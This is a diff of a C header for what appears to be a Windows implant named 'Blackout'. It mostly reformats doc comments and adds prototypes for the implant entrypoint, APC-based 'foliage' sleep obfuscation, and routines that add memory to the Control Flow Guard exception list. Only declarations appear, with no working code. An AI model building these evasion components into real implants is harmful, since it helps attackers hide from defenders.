@@ -76,10 +76,10 @@ BOOL bkHeapFree(
 
 /*!
  * @brief
- * Kill target process
+ * kill target process
  * 
  * @param ProcessId
- * Process id to kill
+ * process id to kill
  */
 BOOL KillProcess(
 	_In_ DWORD ProcessId
@@ -87,19 +87,16 @@ BOOL KillProcess(
 
 /*!
  * @brief
- * Retrieves the infos of the process.
- * 
+ * retrieves the infos of the process
+ *
  * @param FullPath
- * Full path of the process.
+ * full path of the process
  * 
  * @param BaseName
- * Process name.
+ * process name.
  * 
  * @param CmdLine
- * Command line from the process.
- * 
- * @return
- * No return value.
+ * command line from the process
  */
 VOID GetProcessInfo(
 	_Out_     PWSTR *FullPath,
@@ -110,30 +107,15 @@ VOID GetProcessInfo(
 /*!
  * @brief 
  * get informations from the target computer
- * 
- * @param Computername
- * target computer name
- *  
- * @param Domainname
- * target domain that is computer joined
- * 
- * @param NetBios
- * netbios from machine
- * 
- * @param Username
- * target user from machine
- * 
+ *
  * @param ProcessArch
- * Number representing the architecture, needs to be manipulated
+ * number representing the architecture, needs to be manipulated
  * 
  * @param ProcessType
- * Number representing the type of process, needs to be manipulated
+ * number representing the type of process, needs to be manipulated
  * 
  * @param ProductType
- * Number representing the product type, needs to be manipulated
- * 
- * @return
- * No return value
+ * number representing the product type, needs to be manipulated
  */
 VOID GetComputerInfo(
 	_Out_ WORD  *ProcessArch,
@@ -162,6 +144,7 @@ PVOID LdrModuleAddr(
 /*!
  * @brief
  * resolve export function from module
+ * 
  * @param BaseModule
  * module base address to get export function
  * 
@@ -178,9 +161,76 @@ PVOID LdrFuncAddr(
 
 /*!
  * @brief 
- * Initialize implant configs
+ * initialize implant configs
  */
-VOID BlackoutInit();
+VOID BlackoutInit(
+    VOID
+);
+
+/*!
+ * @brief
+ * implant entrypoint
+ * 
+ * @param Param
+ * param passed to implant from caller
+ */
+VOID BlackoutMain(
+    _In_ PVOID Param
+);
+
+VOID SleepMain(
+    DWORD SleepTime
+);
+
+/*!
+ * @brief
+ * foliage sleep obfuscation technique APC based
+ * 
+ * @param SleepTime
+ * time to sleeping
+ */
+VOID FoliageObf( 
+    _In_ DWORD SleepTime
+);
+
+/*!
+ * @brief
+ * check if CFG is enabled
+ * 
+ * @return
+ * return boolean value, TRUE if cfg enabled and FALSE if CFG disabled
+ */
+BOOL CfgCheckEnabled(
+    VOID
+);
+
+VOID CfgAddressAdd( 
+    _In_ PVOID ImageBase,
+    _In_ PVOID Function
+);
+
+/*!
+ * @brief
+ *  add private memory to CFG exception list.
+ * 
+ * @param hProcess
+ *  target process handle 
+ * 
+ * @param Addr
+ *  private memory address to add to the cfg list
+ *
+ * @param Size
+ *  private memory address size to add to the cfg list
+ */
+VOID CfgPrivateAddressAdd(
+    _In_ HANDLE hProcess,
+    _In_ PVOID  Address,
+    _In_ DWORD  Size
+);
+
+EXTERN_C VOID volatile ___chkstk_ms(
+        VOID
+);
 
 /*============================[ Memory ]============================*/
 
